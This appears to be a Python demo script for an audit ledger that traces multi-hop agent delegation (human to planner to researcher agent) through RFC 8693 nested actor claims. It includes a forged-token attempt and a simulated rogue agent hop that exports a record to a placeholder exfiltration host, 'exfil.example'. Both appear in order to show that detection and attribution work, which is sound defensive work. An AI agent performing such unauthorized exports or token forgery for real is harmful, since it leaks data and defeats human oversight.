"""
P6 proof — multi-hop delegation: human -> agent -> agent -> tool, all the way back.

The honest-scope gap Crumb has flagged since P3: a human delegates to an
orchestrator agent, which delegates to a sub-agent, which calls the tool. Who is
accountable? RFC 8693 §4.1 answers it with a NESTED `act` claim — each actor wraps
the prior one, the human stays the `sub` at the root. Crumb implements the chain
end to end: it mints it, records the full actor chain in the crumb, verifies it
back to the human, and — the part that matters — still pins a hijacked hop on the
agent that made it, not on the human at the top.

  1. alice directs a 'planner' agent, which delegates to a 'researcher' sub-agent,
     which reads a record. One crumb, actor_chain = [researcher, planner], sub=alice.
  2. The ledger verifies; the chain walks back to alice.
  3. A forged middle actor breaks the signature — the chain is signed end to end,
     so there is no per-hop seam to rewrite.
  4. A rogue hop calls an action alice never authorized: the crumb flags it
     unauthorized and names the agent chain to blame, with alice cleared.
  5. The same nesting over a REAL RFC 8693 exchange (the live IdP), not the dev key.

Single-issuer chains only — agent->agent->tool under one provider. Cross-issuer
delegation (a chain that spans two IdPs) is still unsolved at the standards level;
flagged, not faked.

Run: python -m crumb.multihop_demo
"""

from __future__ import annotations

import jwt
from fastapi.testclient import TestClient

from . import auth, tokens
from .agent import ToolCall
from .gateway import Gateway
from .idp import _GRANT_TOKEN_EXCHANGE, _TOKEN_TYPE_ACCESS, app
from .ledger import Ledger
from .verify import find_unauthorized, verify_ledger

LEDGER = "data/multihop_ledger.jsonl"
KEY = "data/multihop_ledger.key"
CHAIN = ["planner", "researcher"]   # alice -> planner -> researcher -> tool


def main() -> None:
    print("P6 — multi-hop delegation\n" + "=" * 42)

    gw = Gateway(ledger=Ledger(path=LEDGER, key_path=KEY), agent_id="unused-single")
    gw.ledger.reset()

    # 1. alice directs planner, planner delegates to researcher, researcher reads.
    #    alice authorized read_record at login; the model never gets a say.
    alice = auth.login("alice", directives=("read_record",))
    d = gw.dispatch(alice, ToolCall(name="read_record", arguments={"record_id": 42}),
                    via=CHAIN)
    crumb = d.record
    print("\n1. human -> planner -> researcher -> read_record")
    print(f"   actor_identity (human)   {crumb['actor_identity']!r}")
    print(f"   agent_id (hit the tool)  {crumb['agent_id']!r}")
    print(f"   actor_chain              {crumb['actor_chain']!r}  (most-recent first)")
    print(f"   on_behalf                {crumb['on_behalf_assertion']!r}")
    assert crumb["actor_identity"] == "alice"
    assert crumb["actor_chain"] == ["researcher", "planner"]
    assert crumb["agent_id"] == "researcher"

    # The token itself carries the whole chain, signed as one. Walk it back.
    claims = tokens.verify_delegation(d.token, resource="read_record")
    print(f"   token sub / act-chain    {claims['sub']!r} via {tokens.actor_chain(claims)!r}")
    assert claims["sub"] == "alice"
    assert tokens.actor_chain(claims) == ["researcher", "planner"]
    print("   => the trail leads back through both agents to alice")

    # 2. The ledger verifies — chain intact, signature valid.
    report = verify_ledger(LEDGER, KEY.replace(".key", ".pub"))
    print(f"\n2. ledger verify             {'VERIFIED' if report.ok else 'MISMATCH'} ({report.checked} entr"
          f"{'y' if report.checked == 1 else 'ies'})")
    assert report.ok

    # 3. Forge a MIDDLE actor. The nested act is inside the signed token, so
    #    rewriting planner->evil and re-signing without the key fails the check.
    print("\n3. forge the middle actor")
    open_claims = jwt.decode(d.token, options={"verify_signature": False})
    open_claims["act"]["act"]["sub"] = "evil-injected"   # rewrite the inner hop
    forged = jwt.encode(open_claims, "attacker-key-not-ours", algorithm="HS256")
    try:
        tokens.verify_delegation(forged, resource="read_record")
        print("   forged chain             UNEXPECTEDLY ACCEPTED  <-- bug")
    except jwt.InvalidSignatureError:
        print("   forged chain             rejected (InvalidSignature) — the chain signs as one")

    # 4. A rogue hop calls export_record — which alice NEVER authorized. The action
    #    may technically run, but the crumb records no human directive behind it and
    #    names the agent chain. alice is cleared; planner->researcher is on the hook.
    print("\n4. a rogue hop exports (alice authorized only read_record)")
    gw.dispatch(alice, ToolCall(name="export_record",
                                arguments={"record_id": 42, "destination": "https://exfil.example"}),
                via=CHAIN)
    rogue = find_unauthorized(LEDGER)
    assert len(rogue) == 1 and rogue[0]["action"] == "export_record"
    r = rogue[0]
    print(f"   action                   {r['action']!r}")
    print(f"   directive (human said?)  {r['directive']!r}  (null — alice never authorized it)")
    print(f"   actor_chain to blame     {r['actor_chain']!r}")
    print(f"   human ({r['actor_identity']!r})           recorded, but NOT accountable")
    assert r["on_behalf_assertion"] == "unauthorized"
    assert r["actor_chain"] == ["researcher", "planner"]
    print("   => the hijack is pinned on the agents, the human is exonerated")

    # 5. The same nesting over a REAL RFC 8693 exchange — two hops at the live IdP.
    print("\n5. the chain over a real exchange (live IdP, RS256)")
    client = TestClient(app)
    t1 = _exchange(client, alice.token, "planner", "read_record")     # hop 1: human -> planner
    t2 = _exchange(client, t1, "researcher", "read_record")           # hop 2: re-exchange, nests planner
    real = tokens.verify_delegation(t2, resource="read_record")
    header = jwt.get_unverified_header(t2)
    print(f"   issued token alg         {header['alg']} (provider-signed, kid={header.get('kid')})")
    print(f"   sub / act-chain          {real['sub']!r} via {tokens.actor_chain(real)!r}")
    assert real["sub"] == "alice"
    assert tokens.actor_chain(real) == ["researcher", "planner"]
    print("   => the provider nested the chain; the resource verified it by its key")

    print("\nMulti-hop attribution: every actor in the chain is recorded, the human")
    print("stays provable at the root, and a hijacked hop is pinned where it belongs.")


def _exchange(client: TestClient, subject_token: str, agent_id: str, resource: str) -> str:
    """One real RFC 8693 token-exchange POST. The subject may be the human's session
    (first hop) or a prior delegation token (later hops) — the provider nests it."""
    resp = client.post(
        "/token",
        data={
            "grant_type": _GRANT_TOKEN_EXCHANGE,
            "subject_token": subject_token,
            "subject_token_type": _TOKEN_TYPE_ACCESS,
            "audience": resource,
            "scope": agent_id,
        },
    )
    resp.raise_for_status()
    return resp.json()["access_token"]


if __name__ == "__main__":
    main()
